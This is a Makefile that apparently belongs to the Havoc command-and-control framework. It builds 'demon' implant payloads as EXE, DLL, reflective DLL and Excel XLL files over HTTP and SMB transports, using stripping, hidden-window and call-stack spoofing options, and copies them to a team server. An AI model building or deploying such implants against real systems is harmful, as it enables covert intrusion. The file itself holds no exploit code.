MAKEFLAGS 	+= -s

NAME		= demon

CCX86 		= i686-w64-mingw32-gcc
CCX64 		= x86_64-w64-mingw32-gcc

CFLAGS		=  -Os -fno-asynchronous-unwind-tables -masm=intel # -nostdlib
CFLAGS		+= -fno-ident -fpack-struct=8 -falign-functions=1
CFLAGS  	+= -s -ffunction-sections -falign-jumps=1 -w
CFLAGS		+= -falign-labels=1 -fPIC
CFLAGS		+= -Wl,-s,--no-seh,--enable-stdcall-fixup

CINCLUDE	+= -I Include
OBJECTS		+= Bin/Spoof.o
LINKING		+= -l netapi32 -l ws2_32 -l wsock32 -l wtsapi32 -l crypt32 -l shlwapi -l ntdll -l user32 -l gdi32 -l netapi32

# Sources
SOURCE 		= $(wildcard Source/Core/*) $(wildcard Source/Crypt/*) $(wildcard Source/Inject/*) $(wildcard Source/Loader/*)

DEFINES		= -D SLEEP=3

ifneq (,$(DEBUG))
    DEFINES += -D DEBUG
    CFLAGS	+= $(LINKING)
else
	CFLAGS += -mwindows -nostdlib
endif

all:
	printf "\033[0;36m[*]\033[0m Building demon payloads...\n"

	# TODO: automate this
	nasm -f win64 Source/Asm/Spoof.asm -o Bin/Spoof.o

	# TODO: remove exe. lasting is going to be Dll and Reflective Dll
	$(CCX64) $(SOURCE) $(OBJECTS) $(CINCLUDE) $(CFLAGS) $(DEFINES) -D TRANSPORT_HTTP -m64 Source/Main/MainExe.c -o Bin/demon_http_x64.exe
	printf "\033[0;36m[*]\033[0m Finished HTTP exe payload\n"
	$(CCX64) $(SOURCE) $(OBJECTS) $(CINCLUDE) $(CFLAGS) $(DEFINES) -D TRANSPORT_HTTP -m64 Source/Main/MainDll.c -o Bin/demon_http_x64.dll -e DllMain -shared
	printf "\033[0;36m[*]\033[0m Finished HTTP dll payload\n"
	$(CCX64) $(SOURCE) $(OBJECTS) $(CINCLUDE) $(CFLAGS) $(DEFINES) -D TRANSPORT_HTTP -m64 Source/Main/MainReflectiveDll.c Source/Extra/KaynLdr.c -o Bin/reflective_demon_http_x64.dll -e DllMain -shared
	printf "\033[0;36m[*]\033[0m Finished HTTP reflective dll payload\n"

	# TODO: remove exe. lasting is going to be Dll and Reflective Dll
	$(CCX64) $(SOURCE) $(OBJECTS) $(CINCLUDE) $(CFLAGS) $(DEFINES) -D TRANSPORT_SMB -m64 Source/Main/MainExe.c -o Bin/demon_smb_x64.exe
	printf "\033[0;36m[*]\033[0m Finished SMB exe payload\n"
	$(CCX64) $(SOURCE) $(OBJECTS) $(CINCLUDE) $(CFLAGS) $(DEFINES) -D TRANSPORT_SMB -m64 Source/Main/MainDll.c -o Bin/demon_smb_x64.dll -e DllMain -shared
	printf "\033[0;36m[*]\033[0m Finished SMB dll payload\n"
	$(CCX64) $(SOURCE) $(OBJECTS) $(CINCLUDE) $(CFLAGS) $(DEFINES) -D TRANSPORT_SMB -m64 Source/Main/MainReflectiveDll.c Source/Extra/KaynLdr.c -o Bin/reflective_demon_smb_x64.dll -e DllMain -shared
	printf "\033[0;36m[*]\033[0m Finished SMB reflective dll payload\n"

	cp Bin/* ../Teamserver/data/payloads
	rm Bin/Spoof.o 
	printf "\033[0;36m[*]\033[0m Finished building all payloads\n"

%.o : %.asm
	nasm -f win64 $< -o $@

copysrc:
	printf "[*] Copy source of implant to teamserver...\n"
	rm -rf ../Teamserver/data/implants/Demon
	cp -r ../Demon ../Teamserver/data/implants/Demon 
	printf "[+] Done\n"

exe64:
	printf "\033[0;36m[*]\033[0m Building demon.x64.exe..."

	$(CCX64) $(SOURCE) $(CINCLUDE) $(CFLAGS) $(DEFINES) -D TRANSPORT_HTTP -m64 Source/Main/MainExe.c -o bin/$(NAME).x64.exe

	cp bin/$(NAME).x64.exe ~/Shared-Folder

	printf "\e[32mdone\e[0m\n"

dll64:
	printf "\033[0;36m[*]\033[0m Building demon.x64.dll... "

	$(CCX64) $(SOURCE) $(CINCLUDE) $(CFLAGS) $(DEFINES) -D TRANSPORT_HTTP -m64 Source/Main/MainDll.c -shared -o bin/$(NAME).x64.dll -e DllMain
	$(CCX64) $(SOURCE) $(CINCLUDE) $(CFLAGS) $(DEFINES) -D DLL_XLL -D TRANSPORT_HTTP -m64 Source/Main/MainDll.c -shared -o bin/$(NAME).x64.xll -e DllMain

	cp bin/$(NAME).x64.dll ~/Shared-Folder/
	cp bin/$(NAME).x64.xll ~/Shared-Folder/

	printf "\e[32mdone\e[0m\n"

rdll64:
	printf "\033[0;36m[*]\033[0m Building demon.x64.dll... "

	$(CCX64) $(SOURCE) $(CINCLUDE) $(CFLAGS) $(DEFINES) -m64 Source/Main/MainReflectiveDll.c Source/Extra/KaynLdr.c -shared -o bin/r$(NAME).x64.dll -e DllMain
	cp bin/r$(NAME).x64.dll ~/Shared-Folder/

	printf "\e[32mdone\e[0m\n"


clean:
	rm bin/*
	rm -rf cmake-build-debug
